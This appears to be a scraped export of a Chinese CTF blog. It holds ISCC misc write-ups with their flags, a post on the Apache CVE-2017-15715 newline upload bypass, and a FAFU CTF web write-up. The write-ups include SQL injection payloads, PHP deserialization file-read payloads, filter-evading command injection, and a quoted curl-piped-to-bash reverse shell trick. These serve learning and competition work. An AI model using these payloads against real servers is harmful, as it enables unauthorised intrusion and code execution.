\"RFVGYHNWSXCDEWSXCVWSXCVTGBNMJUY,WSXZAQWDVFRQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVT,QWERTYTRFVBGRDXCVBNBVCXSWERFTYUIOJMTGBNMJUMNBVCDRTGHUWSXCDEQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYTRFVGWSXCVGRDXCVBCVGREDQWERTY(TRFVBTYUIOJMTRFVG),QWERTYGRDXCVBQWERTYTYUIOJMEFVTNBVCXSWERFWSXCDEQWERTYTGBNMJUYTRFVGQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMTGBNMJUYIUYHNBVNBVCXSWERFTGBNMJUYMNBVCDRTGHUTYUIOJM,QWERTYWSXIUYHNBVQWERTYGRDXCVBQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVTQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFWSXCDETYUIOJMWSXTYUIOJMWSXTGBNMJUYZAQWDVFR.QWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYTGBNMJUIUYHNBVTGBNMJUGRDXCVBWSXCVWSXCVEFVTQWERTYWSXCFEWSXCDEIUYHNBVWSXCVGREDZAQWDVFRWSXCDEWSXCFEQWERTYTYUIOJMTGBNMJUYQWERTYIUYHNBVWSXCDEMNBVCDRTGHUEFVGYWSXCDEQWERTYGRDXCVBIUYHNBVQWERTYGRDXCVBZAQWDVFRQWERTYWSXCDEWSXCFETGBNMJUTRFVBGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYWSXCDERGNYGCWSXCDEMNBVCDRTGHUTRFVBWSXIUYHNBVWSXCDEQWERTYTYUIOJMTGBNMJUYQWERTYCVGREDWSXEFVGYWSXCDEQWERTYNBVCXSWERFGRDXCVBMNBVCDRTGHUTYUIOJMWSXTRFVBWSXNBVCXSWERFGRDXCVBZAQWDVFRTYUIOJMIUYHNBVQWERTYWSXCDERGNYGCNBVCXSWERFWSXCDEMNBVCDRTGHUWSXWSXCDEZAQWDVFRTRFVBWSXCDEQWERTYWSXZAQWDVFRQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXZAQWDVFRCVGREDQWERTYGRDXCVBQWERTYXSWEFTYHNGRDXCVBTRFVBRFVGYHNWSXZAQWDVFRWSXCDE,QWERTYGRDXCVBIUYHNBVQWERTYEFVGYWDCFTWSXCDEWSXCVWSXCVQWERTYGRDXCVBIUYHNBVQWERTYTRFVBTGBNMJUYZAQWDVFRWSXCFETGBNMJUTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYTYUIOJMTGBNMJUYQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYIUYHNBVTGBNMJUYMNBVCDRTGHUTYUIOJMQWERTYTGBNMJUYTRFVGQWERTYGRDXCVBTYUIOJMTYUIOJMGRDXCVBTRFVBQAZSCEIUYHNBVQWERTYTRFVGTGBNMJUYTGBNMJUZAQWDVFRWSXCFEQWERTYWSXZAQWDVFRQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBWSXCVQWERTYEFVGYWDCFTTGBNMJUYMNBVCDRTGHUWSXCVWSXCFEQWERTY(WSX.WSXCDE.,QWERTYYHNMKJTGBNMJUCVGREDQWERTYYHNMKJTGBNMJUYTGBNMJUZAQWDVFRTYUIOJMEFVTQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNIUYHNBVQWERTYWSXZAQWDVFRQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTRFVGWSXCDEIUYHNBVIUYHNBVWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYIUYHNBVWSXCDETYUIOJMTYUIOJMWSXZAQWDVFRCVGREDIUYHNBV).QWERTYRFVGYHNWSXCDEMNBVCDRTGHUWSXCDEQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYEFVTTGBNMJUYTGBNMJUMNBVCDRTGHUQWERTYTRFVGWSXCVGRDXCVBCVGRED&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;QWERTYMNBVCDRTGHUWSXCDEEFVGYWSXCDEMNBVCDRTGHUIUYHNBVWSXCDE-WSXCDEZAQWDVFRCVGREDWSXZAQWDVFRWSXCDEWSXCDEMNBVCDRTGHUWSXZAQWDVFRCVGRED,QWERTYZAQWDVFRWSXCDETYUIOJMEFVGYWDCFTTGBNMJUYMNBVCDRTGHUQAZSCEQWERTYIUYHNBVZAQWDVFRWSXTRFVGTRFVGWSXZAQWDVFRCVGRED,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTYUIOJMTGBNMJUYTRFVBTGBNMJUYWSXCVQWERTYGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBV,QWERTYIUYHNBVEFVTIUYHNBVTYUIOJMWSXCDEXSWEFTYHNQWERTYGRDXCVBWSXCFEXSWEFTYHNWSXZAQWDVFRWSXIUYHNBVTYUIOJMMNBVCDRTGHUGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFR,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNXSWEFTYHNWSXZAQWDVFRCVGRED,QWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYGRDXCVBWSXCVWSXCVQWERTYIUYHNBVQAZSCEWSXWSXCVWSXCVIUYHNBVQWERTYEFVGYWDCFTRFVGYHNWSXTRFVBRFVGYHNQWERTYRFVGYHNGRDXCVBEFVGYWSXCDEQWERTYYHNMKJWSXCDEWSXCDEZAQWDVFRQWERTYMNBVCDRTGHUWSXCDEQAZXCDEWVTGBNMJUWSXMNBVCDRTGHUWSXCDEWSXCFEQWERTYYHNMKJEFVTQWERTYNBVCXSWERFMNBVCDRTGHUWSXTGBNMJUYMNBVCDRTGHUQWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBTYUIOJMQWERTYWSXCFEWSXCDETRFVGQWERTYTRFVBTGBNMJUYZAQWDVFR.\"STR = STR.replace(\"WSXCDE\",'e')STR = STR.replace(\"RFVGYHN\",'h')STR = STR.replace(\"WSXCV\",'l')STR = STR.replace(\"TGBNMJUY\",'o')STR = STR.replace(\"TGBNMJU\",'u')STR = STR.replace(\"GRDXCVB\",'a')STR = STR.replace(\"CVGRED\",'g')STR = STR.replace(\"QWERTYTRFVG\",'f')STR = STR.replace(\"WSXCFE\",'d')STR = STR.replace(\"IUYHNBV\",'s')STR = STR.replace(\"QWERTY\",' ')STR = STR.replace(\"TRFVB\",'c')STR = STR.replace(\"QAZSCE\",'k')STR = STR.replace(\"NBVCXSWERF\",'p')STR = STR.replace(\"MNBVCDRTGHU\",'r')STR = STR.replace(\"WSX\",'i')STR = STR.replace(\"EFVT\",'y')STR = STR.replace(\"YHNMKJ\",'b')STR = STR.replace(\"ZAQWDVFR\",'n')STR = STR.replace('XSWEFTYHNXSWEFTYHN','m')STR = STR.replace('EFVGYWDCFT','w')STR = STR.replace('TYUIOJM','t')STR = STR.replace('QAZXCDEWV','t')STR = STR.replace('XSWEFTYHN','m')STR = STR.replace('EFVGY','v')STR = STR.replace('RGNYGC','x')STR = STR.replace('TRFVG', 'f')print((STR).upper()) flag：FLAG{ISCC KEYBOARD CIPHER} Aesop’s secret帧分析，8张图片拼成一张图片 图片末尾最后一串： U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw== BASE64解密后得到Salted__P开头的字符，推测是AES加密 但是网站直接解密失败，猜测有加密的密钥，尝试密钥为拼成图片里的ISCC 解密得U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ== 再次以密钥为ISCC进行一次AES解密，就能得到flag了 flag：flag{DugUpADiamondADeepDarkMine} 他们能在一起吗扫描二维码得到 UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q= 进行base64和url解码得到：PASS{0K_I_L0V3_Y0u!} 分析二维码图片，发现其中还藏有其他文件 用binwalk和dd分离出压缩包，dd if=Reply.png of=1.zip skip=8121 bs=1 其中有文件You won’t Wanna see this.txt，解压密码就是0K_I_L0V3_Y0u! flag：ISCC{S0rrY_W3_4R3_Ju5T_Fr1END} Welcome分离文件得到Welcome.txt，是一串密文，以为是什么加密方式，其实规律在于空格，每个句子一个空格代表0，两个空格代表1，最后得到一串二进制转ascii即可得到flag 12345678910111213141516171819202122232425s = '蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒戶囗 萇條's1 = \"\"flag = \"\"for i in range(len(s)): if s[i] == ' ' and s[i+1] != ' ' and s[i-1] != ' ': s1 = s1 + '0' elif s[i] == ' ' and s[i+1] == ' ': s1 = s1 + '1' if len(s1) == 8: print(s1,chr(int(s1,2))) flag = flag + chr(int(s1,2)) s1 = \"\"print(flag) flag：flag{ISCC_WELCOME} 无法运行的exeexe文件用sublime text打开后得到一串密文，用notepad base64解密后得到一个类似png的文件，保存后修改文件头为89 50 4E 47 0D 0A 1A 0A得到正确的png文件，是个二维码，扫描就得到了flag flag：IScC_2019 最危险的地方就是最安全的地方一个jpg文件，winhex打开发现里面有东西，修改文件后缀zip，解压后发现是一堆二维码 一个个用winhex打开发现最后一个50.jpg与众不同，flag就藏在里面 flag：15cC9012 没有flag标签，试了几分钟也是挺坑的，还好手快还有前十血emmm 解密成绩单下载后的文件时一个压缩包，解压需要密码，但是用winhex打开后可以发现文件末尾有504B开头的十六进制数， 发现0908说明存在zip伪加密，将09改为00即可 压缩后时一个exe文件，需要用户名和密码，老样子用winhex打开 发现admin字样，猜测用户名就是admin，密码就是后面那串ISCC开头的字符，这个密码也尝试了挺久的，因为前后存在混淆的字符 最后正确的密码是：ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n 登陆后即可获得flag High起来！下载后的压缩包解压后得到一张损坏的png图片，在kali下修改png文件头，输入!%xxd进入十六进制编辑 修改文件头为8950后在命令输入!%xxd -r返回原来的编码后保存 修复后得到一个二维码，扫描后的内容：中口由羊口中中大中中中井 查询后发现是一个当铺密码，解密网站http://www.zjslove.com/3.decode/dangpu/index.html 解密后得到：201902252228 但是这个还不是flag，我们可以发现png图片中还隐藏了一个mp3文件，将png改成zip解压得到mp3文件，前面又解密得到了密码，所以很明显就是考察mp3隐写，这就需要使用到工具Mp3stego 解密后得到01.mp3.txt文件，内容是： 1&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125; 拿去Unicode解密即可得到flag：flag{PrEtTy_1ScC9012_gO0d} 这里提交的时候也要把flag{}去掉，也是坑 碎纸机原图可以分离成十个图片，分离后的十张图每张图末尾处都不一样 猜测信息就包含在里面，我们需要将信息提取出来，根据题目提示欧鹏曦文猜测可能需要opencv脚本来提取，但是无奈没写过，只能肉眼识别了 将多出来的这一部分的十六进制复制到notepad++里 点击 设置-&gt;首选项-&gt;编辑-&gt;勾选“显示列边界”-&gt;边界宽度设置为51（或26），然后 Ctrl+I ，文本每行就51个字符自动分行了 然后 Ctrl+F-&gt;标记-&gt;查找目标为0-&gt;查找全部 ，就可以给所有0标记颜色，做完这两步后，发现了类似flag的字符： 将10张图片都这样做，选择完整的一边截图然后拼接起来： flag：Flag={ISCC_is_so_interesting_!}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"利用Apache解析漏洞(CVE-2017-15715)绕过文件上传限制getshell","slug":"利用Apache解析漏洞绕过文件上传限制getshell","date":"2019-05-20T07:15:00.000Z","updated":"2019-05-20T17:03:05.208Z","comments":true,"path":"/posts/6413/","link":"","permalink":"https://Foxgrin.github.io/posts/6413/","excerpt":"这几天做中南大学的院赛web题碰到了一道上传题，正好利用到了去年发布的一个cve，虽然漏洞有点鸡肋，但是作为一种姿势了解一下还是不错的，故此记录总结一下","text":"这几天做中南大学的院赛web题碰到了一道上传题，正好利用到了去年发布的一个cve，虽然漏洞有点鸡肋，但是作为一种姿势了解一下还是不错的，故此记录总结一下 漏洞概述在Apache 2.4.0到2.4.29版本中使用到了如下的配置信息： 123&lt;FilesMatch \\.php$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这是一个php文件的解析表达式，我们可以注意到$，这个解析漏洞的根本原因就是这个$。我们知道$在正则表达式中用来匹配字符串结尾位置，在菜鸟教程中对正则表达符$的解释如下： 1匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 \\$。 说明了$是可以匹配到字符串结尾的换行符，也就是说，如果我们此时有个文件后缀名为：.php\\n，Apache是会将其作为php文件进行解析的 漏洞利用了解了该解析漏洞，我们便可以利用它来绕过上传的黑名单限制，例如存在下面的上传逻辑： 123456789&lt;?phpif(isset($_FILES['file'])) &#123; $name = basename($_POST['name']); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) &#123; exit('bad file'); &#125; move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);&#125; 这里使用到了黑名单过滤方式，但是如果我们利用上述漏洞，上传一个文件名为：1.php\\x0a，那么便可以成功绕过黑名单的限制上传php文件 实例演示实例来自于中南大学的院赛ctf中的一道题，题目名字是upload something 题目页面如下： 上传文件时可以发现，不论正常上传什么文件，login.php都显示bad file 我们抓包可以发现，请求包中额外post一个参数name 这就想到了我们分析的Apache解析漏洞，如果文件名取自$_FILES[&#39;file&#39;][&#39;name&#39;]，就会自动把换行符去掉，而文件名取自post参数name中，就能很好的利用到这个解析漏洞 下面我们上传一个包含换行符的文件，这里需要注意只能时\\x0a而不是\\x0d\\x0a，\\x0d\\x0a的情况是我们直接添加一个换行符，我们利用burp的hex功能在test666.php后面添加一个\\x0a 从响应包中可以看到上传成功了，但是相应页面success.html中并没有告诉我们上传文件的目录 但是我们在请求包中还可以看到一个参数dir = /upload/，所以猜测上传目录为·/upload/test666.php%0a 访问成功，最后就是上木马拿shell了 最后我们可以看一下upload.php的源码： 12345678910111213141516171819202122232425262728293031&lt;?phpif(isset($_FILES['file'])) &#123; $name = basename($_POST['name']); $ext = pathinfo($name,PATHINFO_EXTENSION); $ext = pathinfo($name,PATHINFO_EXTENSION); if(preg_match('/php/',$ext))&#123; if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml'])) &#123; header(\"location:hacker.html\"); exit('bad file'); &#125; if(!move_uploaded_file($_FILES['file']['tmp_name'], '../upload/'. $name))&#123; exit('upload failed'); &#125;else&#123; header(\"location:success.html\"); &#125; //move_uploaded_file($_FILES['file']['tmp_name'], './' . $name); &#125;else&#123; header(\"location:hacker.html\"); exit('bad file'); &#125;&#125; ?&gt; 验证的逻辑就是首先利用正则匹配验证后缀名是否包含了php，第二步就是利用黑名单过滤，但是由于未过滤php%0a，并且取post参数name作为文件名，所以便可以很好的利用到apache的解析漏洞，另外我们还可以看一下apache配置文件，文件目录在/etc/apache2/conf-available/docker-php.conf： 123&lt;FilesMatch \\.php$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 正如我们前面提到的配置文件内容一样，$能匹配到换行符\\x0a，这就造成了该解析漏洞 总结这个漏洞利用的条件如下： 获取文件名时不能用$_FILES[&#39;file&#39;][&#39;name&#39;]，因为他会自动把换行去掉，这一点有点鸡肋 Apache版本为2.4.0到2.4.29 服务器必须是linux系统，因为windows环境下不支持后缀名带有换行符\\x0a 总体上而言，只要取$FILES[&#39;file&#39;][&#39;name&#39;]作为文件名，就可以无视该解析漏洞，所以该漏洞总体来说实际用处不大，但是由于根本成因在于$，在以后的其他某些漏洞可以还有利用到的地方，作为一种姿势学习一下还是蛮有趣的。 最后附上参考链接： 利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单 apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制 Apache最新解析漏洞：CVE-2017-15715复现","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"2019-FAFU-ctf WP","slug":"2019-FaFu-ctf-Writeup","date":"2019-04-29T07:15:00.000Z","updated":"2019-05-20T01:29:45.705Z","comments":true,"path":"/posts/10503/","link":"","permalink":"https://Foxgrin.github.io/posts/10503/","excerpt":"第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的","text":"第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的 所有题目都已经传到github上面了：https://github.com/Foxgrin/2019-Fafu-ctf Web签到得到flag的条件：md5($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;]) 考察的是md5和sha1函数无法处理数组的特性，处理结果都是NULL payload： 1name[]=1&amp;password[]=2 flag：flag{WelCome_To_Fafu_2019_ctf} login1扫描目录发现存在.git泄露 使用githack进行还原即可 还原后发现flag文件：{975fdb8c8c79c7c9502834c1baf02b36} sqli提示：id is not in whitelist. 猜测注入点在参数id，GET传参id=1得到回显信息 经过fuzz测试，题目通过黑名单的方式过滤了or，union，*，benchmark，sleep，if，case 无法使用联合注入，盲注，但是报错注入函数extractvalue和updatexml都未被过滤 尝试payload： 1?id=1 and extractvalue(1,concat(0x3a,database(),0x3a))%23 发现concat又被过滤了，但是可以用make_set函数来代替 注数据库名payload： 1?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,database()))%23 数据库名：web 因为这里or被过滤了，所以无法使用information_schema库得到表名和列名 猜测列名flag在表名flag中： 1?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,(select flag from flag)))%23 得到flag：flag{1n0rRY_i3_Vu1n3rab13} 黑曜石浏览器抓包发现响应包头部字段藏有提示字段：hint: include($_GET[&quot;file&quot;]) 提示考察文件包含，使用php伪协议读取index.php源码： 1?file=php://filter/convert.base64-encode/resource=index.php 123456789101112131415161718192021222324252627&lt;?php error_reporting(0);if(!isset($_GET['file']))&#123; header('hint:include($_GET[\"file\"])'); include('heicore.html');&#125;$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];include($file); //class.phpif(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/f1a9/\",$file))&#123; exit(); &#125;else&#123; $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo \"you are not admin ! \";&#125; ?&gt; file_get_contents函数同样用伪协议php://input利用 源代码中还给了提示文件class.php，同样方法读取源代码： 12345678910&lt;?phpclass Read&#123;//f1a9.phppublic $file;public function __toString()&#123;if(isset($this-&gt;file))&#123;echo file_get_contents($this-&gt;file);&#125;return \"__toString was called!\";&#125;&#125; 发现是一个Read类，其中魔术方法__toString在当对象被当做字符串时候会自动调用，调用后会执行file_get_contents函数读取文件，结合class.php中的反序列化函数unserialize，我们可以构造对象的序列化字符来读取f1a9.php文件 构造序列化字符的代码如下： 12345678910111213141516&lt;?phpclass Read&#123;//f1a9.phppublic $file;public function __toString()&#123;if(isset($this-&gt;file))&#123;echo file_get_contents($this-&gt;file);&#125;return \"__toString was called!\";&#125;&#125;$r = new Read();$r-&gt;file = \"f1a9.php\";echo serialize($r);?&gt; 得到的序列化字符： 1O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; 最终payload： 1234567891011121314POST /?file=class.php&amp;user=php://input&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1Host: 172.31.19.47Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: _ga=GA1.1.1968814565.1555932724; _gid=GA1.1.1377480033.1555932724Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17the user is admin login2密码字段过滤了&#39;，#，||，or 在用户名字段尝试admin&#39;#，回显的信息为：Wrong username / password. 尝试admin&#39; or 1#，回显的信息为：Wrong password for users 回显的信息不同，猜测用户名admin其实是不存在的，并且后台还对我们输入的密码进行了验证 admin&#39; union select 1,2#，回显信息：Wrong password for 1 有注入点，开始常规注入，数据库名为fafuctf，表名为users，列名为username,password 注password： 1username=admin&apos; union select group_concat(password),2 from users#&amp;password=1 password：8235020a76bf2f8e3e30c500c3f309220d26c544 同样的方法注出用户名为：users 尝试登陆但是失败，观察密码字段 猜测密码字段经过加密，从40位字符可以猜到是sha1加密，结合前面的分析，可以猜测出，后台进行的密码验证为$row[&#39;password&#39;] === sha1($_POST[&#39;password&#39;]) 我们可以通过union构造password字段的查询值，所以最终payload为： 1username=admin&apos; union select 1,sha1(2)#&amp;password=2 flag：flag{SqLi_InjEc4ion_Is_So_E@Sy} Blog扫描后台发现存在备份文件www.zip 审计源码，网站目录如下： 12345678910111213html tree.├── passage│ ├── title.php│ ├── words.php├── templates│ ├── About.php│ ├── Flag.php│ ├── Link.php│ ├── passage.php├── class.php├── index.php├── waf.php 审计源码 在index.php中，发现可以通过参数$_GET[&#39;page&#39;]执行命令，但是该参数经过waf和file_exists的过滤处理， 所以无法通过$_GET[&#39;page&#39;]函数执行命令 另外发现了反序列化函数，猜测可以构建类，正好根目录下存在文件class.php 跟踪class.php，虽然同样有waf，但是可以绕过，最终payload： 12345678910111213POST /?page=Passge&amp;tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:26:&quot;%26/bin/ca?%09./templates/Flag&quot;;&#125; HTTP/1.1Host: 172.31.19.53Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12you got this 这个payload其实使用了统配符来绕过WAF，在linux下，/bin/ca? 相当于/bin/cat 。由于过滤了符号 ‘&lt;’ 和空格，所以无法使用 cat ./templates/Flag ，但是我们可以使用%09（Tab）来替换空格，绕过WAF。 另外要注意的是file值%26/bin/ca?%09./templates/Flag的长度，%26会被URL解码为&amp;，%09会被解码会Tab，所以%26和%09长度都相当于1 赛后从福大师傅那里得知单引号能绕过黑名单过滤ca&#39;&#39;t，他们给的payload是tips=O:4:&quot;Blog&quot;:1:{s:4:&quot;file&quot;;s:18:&quot;%;c&#39;&#39;at%09./waf.php;&quot;;} 另外福大师傅还有;cu&#39;&#39;rl\\$IFS\\$9{x.x.x.x}|bash;直接拿shell的方法 fakebook注册信息后，在view.php页面，发现url存在参数no存在sql注入，过滤了union select，采用/**/代替空格 注库：?no=0%20union/**/select%201,database(),3,4 注表：?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database() 注列：?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 注data：?no=0%20union/**/select%201,data,3,4%20from%20users 发现data是一串序列化字符串，并且给出了类的所有信息，结合页面age和blog字段无法显示以及反序列化函数报错信息，猜测后台将data信息取出进行了反序列化处理，并且，在页面下方通过iframe标签将博客页面访问出来，说明可能利用了php的curl扩展对我们注册的博客信息进行请求，并将请求获得的页面内容通过iframe标签显示出来，说明可能存在SSRF漏洞，其原理与读取文件类似，我们通过报错信息知道了网站的绝对目录，便可以利用file协议进行读取任意文件，但是要注意需要序列化处理 最终获得flag的payload： 